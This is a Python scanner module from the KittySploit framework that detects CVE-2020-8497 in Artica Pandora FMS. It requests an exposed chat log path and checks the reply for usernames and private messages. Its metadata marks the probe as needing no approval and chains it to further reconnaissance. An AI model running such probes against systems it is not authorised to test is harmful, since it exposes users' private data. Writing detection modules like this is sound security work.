#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Artica Pandora FMS through 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Pandora FMS <=7.42 - Arbitrary File Read Detection',
        'description': 'Artica Pandora FMS through 7.42 is susceptible to arbitrary file read. An attacker can read the chat history, which is in JSON format and contains user names, user IDs, private messages, and timestamps. This can potentially lead to unauthorized data modification and other operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'fms', 'artica', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://k4m1ll0.com/cve-2020-8497.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8497',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-8497',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pandora_console/attachment/pandora_chat.log.json.txt', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"type"', '"id_user"', '"user_name"', '"text"',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Artica Pandora FMS <=7.42 - Arbitrary File Read detected",
                path='/pandora_console/attachment/pandora_chat.log.json.txt',
            )
            return True
        return False

